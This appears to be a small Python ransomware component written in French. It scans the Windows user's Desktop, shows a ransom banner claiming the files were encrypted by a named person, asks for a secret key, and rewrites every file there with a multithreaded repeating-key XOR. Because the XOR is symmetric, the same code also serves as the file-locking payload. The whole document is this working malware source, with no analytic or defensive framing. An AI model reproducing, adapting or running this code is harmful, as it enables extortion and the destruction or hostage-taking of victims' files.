import os
from queue import Queue
from threading import Thread


def decrypter(cle):
    while True:
        fichier = q.get()
        index = 0
        max_index = len(cle) - 1
        print(f'Decryptage de {fichier}...')
        try:
            with open(fichier, 'rb') as f:
                donnees = f.read()
            with open(fichier, 'w') as f:
                f.write('')
            for byte in donnees:
                xor_byte = byte ^ ord(cle[index])
                with open(fichier, 'ab') as f:
                    f.write(xor_byte.to_bytes(1, 'little'))
                if index >= max_index:
                    index = 0
                else:
                    index += 1
                print(f'reussi')
        except:
            print(f'decryptage de {fichier} non reussi')
        q.task_done()

#informations de decryptage 
degre_cryptage = 128 // 8
caracteres = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789<>?,./@!'

#obtenir les fichiers a decrypter
print("scanner les fichiers...")
dir_bureau = os.environ['USERPROFILE']+'\\Desktop'
fichiers = os.listdir(dir_bureau)
fichiers_a_decrypter = []
for f in fichiers:
    if os.path.isfile(f'{dir_bureau}\\{f}') and f != __file__[:-2]+'exe':
        fichiers_a_decrypter.append(f'{dir_bureau}\\{f}')
print('fichiers localises')

cle = input('DONNEE CYPTES PAR SALIM GHOUDANE!!!!!! \n Veuillez entrer la cle secrete pour recuperer vos donnees: ')

q = Queue()
for f in fichiers_a_decrypter:
    q.put(f)

for i in range(10):
    t = Thread(target=decrypter, args=(cle,), daemon=True)
    t.start()

q.join()
print("decryptage reussi!")
